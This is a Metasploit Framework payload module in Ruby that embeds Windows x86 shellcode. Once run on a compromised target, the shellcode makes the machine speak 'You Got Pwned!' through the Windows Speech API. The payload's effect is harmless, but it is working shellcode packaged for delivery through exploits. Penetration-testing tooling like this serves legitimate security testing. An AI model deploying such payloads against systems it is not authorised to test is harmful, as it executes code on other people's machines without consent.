##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

=begin

http://www.exploit-db.com/sploits/w32-speaking-shellcode.zip

Copyright (c) 2009-2010 Berend-Jan "SkyLined" Wever <berendjanwever@gmail.com>
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:
    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in the
      documentation and/or other materials provided with the distribution.
    * Neither the name of the copyright holder nor the names of the
      contributors may be used to endorse or promote products derived from
      this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED ''AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

=end

require 'msf/core'
require 'msf/core/payload/windows/exec'


module Metasploit3

  include Msf::Payload::Windows
  include Msf::Payload::Single

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows Speech API - Say "You Got Pwned!"',
      'Description'   => 'Causes the target to say "You Got Pwned" via the Windows Speech API',
      'Author'        => [ 'Berend-Jan "SkyLined" Wever <berendjanwever[at]gmail.com>' ],
      'License'       => BSD_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Privileged'    => false,
      'Payload'       =>
      {
        'Offsets' => { },
        'Payload' =>
          "\x66\x81\xe4\xfc\xff\x31\xf6\x64\x8b\x76\x30\x8b" +
          "\x76\x0c\x8b\x76\x1c\x56\x66\xbe\xaa\x1a\x5f\x8b" +
          "\x6f\x08\xff\x37\x8b\x5d\x3c\x8b\x5c\x1d\x78\x01" +
          "\xeb\x8b\x4b\x18\x67\xe3\xeb\x8b\x7b\x20\x01\xef" +
          "\x8b\x7c\x8f\xfc\x01\xef\x31\xc0\x99\x32\x17\x66" +
          "\xc1\xca\x01\xae\x75\xf7\x49\x66\x39\xf2\x74\x08" +
          "\x67\xe3\xcb\xe9\xdb\xff\xff\xff\x8b\x73\x24\x01" +
          "\xee\x0f\xb7\x34\x4e\x8b\x43\x1c\x01\xe8\x8b\x3c" +
          "\xb0\x01\xef\x31\xf6\x66\x81\xfa\xda\xf0\x74\x1b" +
          "\x66\x81\xfa\x69\x27\x74\x20\x6a\x32\x68\x6f\x6c" +
          "\x65\x33\x54\xff\xd7\x95\x66\xbe\xda\xf0\xe9\x95" +
          "\xff\xff\xff\x56\xff\xd7\x66\xbe\x69\x27\xe9\x89" +
          "\xff\xff\xff\x68\x6e\x04\x22\xd4\x68\xa1\xec\xef" +
          "\x99\x68\xb9\x72\x92\x49\x68\x74\xdf\x44\x6c\x89" +
          "\xe0\x68\x4f\x79\x73\x96\x68\x9e\xe3\x01\xc0\xff" +
          "\x4c\x24\x02\x68\x91\x33\xd2\x11\x68\x77\x93\x74" +
          "\x96\x89\xe3\x56\x54\x50\x6a\x17\x56\x53\xff\xd7" +
          "\x5b\x68\x6f\x67\x20\x55\x68\x6f\x70\x20\x74\x68" +
          "\x21\x64\x6e\x68\x96\x89\xe6\x50\xac\x66\x50\x3c" +
          "\x55\x75\xf9\x89\xe1\x31\xc0\x50\x50\x51\x53\x8b" +
          "\x13\x8b\x4a\x50\xff\xd1\xcc"
      }
      ))

    # EXITFUNC is not supported :/
    deregister_options('EXITFUNC')
  end

end
